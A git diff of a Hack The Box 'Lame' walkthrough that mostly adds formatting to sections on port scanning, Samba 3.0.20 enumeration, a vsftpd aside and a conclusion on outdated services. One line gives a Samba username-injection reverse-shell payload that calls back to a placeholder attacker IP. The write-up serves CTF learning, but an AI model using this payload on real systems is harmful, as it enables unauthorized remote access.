@@ -1,8 +1,12 @@
+___
 ## Machine Information
 
-Machine Name: HTB-Lame
-Machine IP: 10.10.10.3
+- **Machine Name:** Lame
+- **Machine IP:** 10.10.10.3
+- **Machine Type:** Easy
+- **Machine OS:** Linux
 
+___
 ## Ports & Service scanning
 
 One of the best way to start the journey of pwning a machine is to scan for open ports and services. For most of the time, you will find an entry point on these ports or services because let's be fair, they are meant to be vulnerable during a ctf or challenge.
@@ -97,7 +101,7 @@ When nmap performs -O option, it will initially begin with a standard scan that 
 - **Port 22:** A OpenSSH service is running on this port, which is generally used for establishing command-line remote connection between two systems.
 - **Port 139 and 445:** These two ports are running Samba 3.0.20, which is a suite of programs that allows Linux/Unix systems to act as file and printer servers, enabling them to share resources with Windows system using SMB protocol. OS discovery on smb shows that it is a Unix system.
 
-
+___
 ## Service Enumeration
 
 After going through all open ports and services, it is time to look for loopholes or flaws in those services. There are always flaws, because that's how those machines are built. In most cases, I simply start by googling the service name and its version to find available vulnerabilities or exploits, then my next step is to use a very well-known tool for searching exploits, which is searchsploit. I have demonstrated both the ways in this writeup, and they are one of the best ways if you are starting the journey of exploitation. 
@@ -218,7 +222,7 @@ This exploits a command execution vulnerability in *Samba version 3.0.20* throug
 
 While performing login through smbclient, we can provide the following string *"/=nohup bash -i >& /dev/tcp/Attacker_IP/4444 0>&1* to spawn a reverse shell on our IP at 4444 port number. The value */=nohup* makes all this possible. 
 
-
+___
 ## BONUS: Why vsftpd exploit was not working
 
 Once I got the root access and when I was finished with the flags, I wanted to see that why vsftpd's exploit was not working. It is out of the scope of machine-pwning, but it is always a good practice to see where you went wrong. I started scanning the ports that were listening within the system, and now I am inside the target so I might see more listening ports than the output we got from nmap. It is because some of the ports might be filtered by firewall and standard nmap scan will not display them.
@@ -259,7 +263,7 @@ This was the exploit that worked for us, and we were able to access the system w
 
 ![](images-lame/13.png)
 
-
+___
 ## Conclusion
 
 Many organizations or individuals do not focus on the versions of service that they are utilizing. For most of the hacks, it is the outdated service that is breached and gave access to system or data. It is really important as a cybersecurity professional to look for outdated ports and services within a company and find a way to mitigate potential or actual vulnerabilities within them. As a red teamer, while participating into any CTFs or Challenges, it is important to look closely on the versions of services, because open services are an entry-gateway inside the system and if they are running an older version then there can be chances that they can get exploited.
